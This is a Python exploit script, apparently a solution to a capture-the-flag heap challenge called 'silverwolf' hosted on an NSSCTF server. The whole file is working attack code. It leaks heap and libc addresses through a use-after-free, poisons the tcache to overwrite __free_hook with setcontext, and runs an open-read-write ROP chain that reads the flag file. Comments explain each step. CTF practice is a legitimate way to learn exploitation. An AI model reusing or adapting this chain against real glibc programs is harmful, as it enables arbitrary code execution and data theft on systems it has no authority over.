from PwnModules import *

io, elf = get_utils('./silverwolf', False, 'node4.anna.nssctf.cn', 28359)
init_env('amd64', 'debug')
libc = ELF('/home/kaguya/PwnExp/Libc/NSS/2.27-1.4/libc-2.27.so')


def choice(idx):
    io.recvuntil(b'choice: ')
    io.sendline(str(idx))


def add(size):
    choice(1)
    io.sendlineafter(b'Index: ', str(0))
    io.sendlineafter(b'Size: ', str(size))


def edit(content):
    choice(2)
    io.sendlineafter(b'Index: ', str(0))
    io.sendlineafter(b'Content: ', content)


def free():
    choice(4)
    io.sendlineafter(b'Index: ', str(0))


def show():
    choice(3)
    io.sendlineafter(b'Index: ', str(0))


# Leak heap base addr

add(0x78)
free()
show()

io.recvuntil(b'Content: ')
heap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x11b0
show_addr('Heap base address: ', heap_base)

# Take out Tcache Struct, Leak our libc base address !

edit(p64(heap_base + 0x10))  # Cannot allocate at base, since it wil break the struct.
add(0x78)
add(0x78)

edit(p64(0) * 4 + p64(0x0000000007000000))

free()
show()

libc_base = leak_addr(2, io) - 0x70 - libc.sym['__malloc_hook']
show_addr('Libc base addr: ', libc_base)

# edit(b'\x00' * 0x78) # Alternate choice.
edit(p64(0) * 4 + p64(0x0000000000000000))

# Gadgets

free_hook = libc_base + libc.sym['__free_hook']
pop_rdi = libc_base + 0x215BF
pop_rax = libc_base + 0x43AE8
pop_rsi = libc_base + 0x23EEA
pop_rdx = libc_base + 0x1B96
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
setcontext = libc_base + libc.sym['setcontext'] + 53
syscall = libc_base + 0xE5965
flag_addr = heap_base + 0x1000
ret = libc_base + 0x8AA

# Construct Heap

orw1 = heap_base + 0x3000
orw2 = heap_base + 0x3060

stack_pivot_1 = heap_base + 0x2000
stack_pivot_2 = heap_base + 0x20A0

show_addr('Address: ', heap_base, free_hook, flag_addr, orw1, orw2, stack_pivot_1, stack_pivot_2)

payload = b'\x00' * 0x40
payload += p64(free_hook)  # 0x20
payload += p64(0)
payload += p64(flag_addr)
payload += p64(stack_pivot_1)
payload += p64(stack_pivot_2)
payload += p64(orw1)
payload += p64(orw2)

edit(payload)

# Open

orw = p64(pop_rdi) + p64(flag_addr)
orw += p64(pop_rax) + p64(2)
orw += p64(pop_rsi) + p64(0)
orw += p64(syscall)

# Read

orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw1)
orw += p64(pop_rdx) + p64(0x30)
orw += p64(read)

# Write

orw += p64(pop_rdi) + p64(1)
orw += p64(write)

add(0x18)
# Why we only need one allocate is because we directly changed the link list.
# Means the chunk will allocate at where we want.
# In this case, We don't need to push addr into link list because we allocate just at here.
# (0x20)   tcache_entry[0](0): 0x7f53257278e8 -----> __free_hook
edit(p64(setcontext))
# Hijack __free_hook to setcontext
# Why hijack __free_hook instead of any other function ?
# When executing __free_hook, The RDI reg is just the chunk addr.
# Which means when we execute the free, We execute the setcontext with our ROP chain.
add(0x38)
# Store the flag file position.
# (0x40)   tcache_entry[2](0): 0x556a73c3d000 -----> flag_addr
edit('./flag')

add(0x68)
edit(orw[:0x60])
# orw1
add(0x78)
edit(orw[0x60:])
# orw2

add(0x58)
# stack_pivot_2
edit(p64(orw1) + p64(ret))
add(0x48)
# stack_pivot_1

free()
# Trigger the ROP chain.

io.interactive()
